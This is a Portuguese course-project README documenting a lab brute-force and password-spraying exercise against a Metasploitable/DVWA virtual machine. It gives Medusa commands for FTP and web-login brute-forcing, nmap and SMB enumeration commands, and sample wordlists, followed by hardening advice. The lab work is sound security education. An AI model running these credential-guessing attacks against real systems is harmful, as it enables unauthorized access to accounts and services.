# 📋 DIO e Santander Cibersegurança - 2025
###  Este repositório contém um projeto prático com foco educacional em ataques de força bruta e password spraying, utilizando Kali Linux e a ferramenta Medusa. Os testes descritos foram realizados exclusivamente em ambientes controlados e autorizados (Máquinas Virtuais como Kali + Metasploitable/DVWA) 

 ### 🔧 Ferramentas

 Kali Linux 2024.1

 Medusa 2.2

 Metasploitable 2

 VirtualBox 7.0

### 🗂️ O que tem neste repositório

 • README.md (este arquivo)

• wordlists/ contendo as listas de usuários e senhas utilizadas nos testes (curtas, para demonstração)
Obs: Não foram incluídos logs nem capturas — apenas documentação e wordlists.

### 💻 Comandos que utilizei

### Teste de conectividade

ping -c 3 192.168.18.103

### Reconhecimento

nmap -sV -p 21,22,80,445,139 192.168.18.103

### ⚔️ Ataque FTP (Medusa) — lista de usuários + senhas

medusa -h 192.168.18.103 -U wordlists/users.txt -P wordlists/pass.txt -M ftp -t 6

### Validação de FTP (conexão manual)

ftp 192.168.18.103

### Ataque em formulário web (Medusa — tentativa)

medusa -h 192.168.18.103 -U wordlists/users.txt -P wordlists/pass.txt -M http -m PAGE:'/dvwa/login.php' -m FORM:'username=^USER^&password=^PASS^&Login=Login' -m Fail='Login failed' -t 6

### 🔎 Enumeração SMB e tentativa de acesso

enum4linux -a 192.168.18.103 | tee enum4_output.txt
smbclient -L //192.168.18.103 -U msfadmin

### Wordlists incluídas

As wordlists são curtas e destinadas à demonstração.

### • wordlists/pass.txt

123456

password

qwerty

msfadmin

### • wordlists/users.txt

user

msfadmin

admin

root

### 🛡️ Medidas de Mitigação e Boas Práticas

### 1. Para Serviço FTP

### Configurações seguras no vsftpd.conf

anonymous_enable=NO

local_enable=YES

write_enable=YES

local_umask=022

chroot_local_user=YES

allow_writeable_chroot=YES



### 2. Para Aplicações Web (DVWA)

### Implementar rate limiting

### Exemplo em .htaccess

<Limit POST>
  
order deny,allow
    
deny from all
    
allow from 192.168.18.100/200
    
</Limit>

### Configurar WAF (Web Application Firewall)

### 3. Para Serviço SMB

### Configurações seguras no smb.conf

[global]

security = user
    
encrypt passwords = yes
    
smb passwd file = /etc/samba/smbpasswd
    
min protocol = SMB2

   ### 📝 4. Medidas Gerais de Segurança

  ### Políticas de Senha

Implementar política de senhas complexas

Mínimo 12 caracteres, maiúsculas, minúsculas, números e símbolos

### Bloqueio por Tentativas

 Configurar fail2ban para proteção
 
 /etc/fail2ban/jail.local
 
[sshd]

enabled = true

maxretry = 3

bantime = 3600

### Autenticação Multi-Fator

Implementar 2FA sempre que possível

Usar Google Authenticator ou similares

### 🎯 Conclusões e Aprendizados

Lições Aprendidas

Ferramentas de Automação: Medusa é extremamente eficiente para testes de força bruta

Importância das Wordlists: A qualidade da wordlist impacta diretamente no sucesso do ataque

Configuração Segura: Serviços mal configurados são a principal vulnerabilidade

Monitoramento Contínuo: Detecção precoce é crucial para mitigação

### 📄 Licença

Este projeto tem finalidade educativa. Adote uma licença apropriada para o repositório (por exemplo, MIT) e deixe claro o uso restrito a ambientes autorizados.













